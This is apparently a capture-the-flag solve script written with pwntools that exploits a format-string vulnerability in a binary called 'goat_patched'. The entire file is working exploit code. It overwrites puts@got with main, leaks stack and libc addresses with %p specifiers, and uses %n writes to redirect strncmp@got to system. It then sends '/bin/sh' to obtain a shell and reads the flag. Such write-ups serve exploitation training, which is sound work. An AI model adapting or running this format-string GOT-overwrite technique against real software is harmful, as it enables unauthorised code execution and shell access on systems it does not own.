#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'goat_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*main
b*0x40125d
b*0x40124c
b*0x401278
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================
# overwrite puts@got = main
puts_got = 0x404008
strncmp_got = 0x404000

main = 0x4011f0

payload = b'%4568c%10$hn' + b'A'*4 + p64(puts_got)

# leak save rbp (stack), saved rip (libc)
sla(b'your name? ', payload)
sl(b'DTM')
# pause()

sla(b'your name? ', b'%11$p.%54$p.')
p.recvuntil(b'Are you sure? You said:\n')
srbp = int(p.recvuntil(b'.')[:-1], 16)-0x10
libc.address = int(p.recvuntil(b'.')[:-1], 16)-0x2044e0
log.info(f'saved rbp: {hex(srbp)}')
log.info(f'libc: {hex(libc.address)}')

system = libc.sym['system']

sl(b'DTM')

# pause()

padding = int(strncmp_got)-0x18
payload = f'%{padding}c%10$n'.encode().ljust(16, b'\x00') + p64(srbp-0x88)
sla(b'your name? ', payload)
sl(b'DTM')

# pause()
padding = int(strncmp_got+1)-0x18
payload = f'%{padding}c%10$n'.encode().ljust(16, b'\x00') + p64(srbp-0x80)
sla(b'your name? ', payload)
sl(b'DTM')

log.info(f'LAST STEP')
# pause()
log.info(f'system: {hex(system)}')
part1 = int(system & 0xff)-0x18
part2 = (int(system >> 8 & 0xffff)) - 0x18 - part1
payload = f'%{part1}c%91$hhn%{part2}c%92$hn'.encode()
sla(b'your name? ', payload)
sl(b'/bin/sh\x00')

sl(b'cat flag*')

p.interactive()
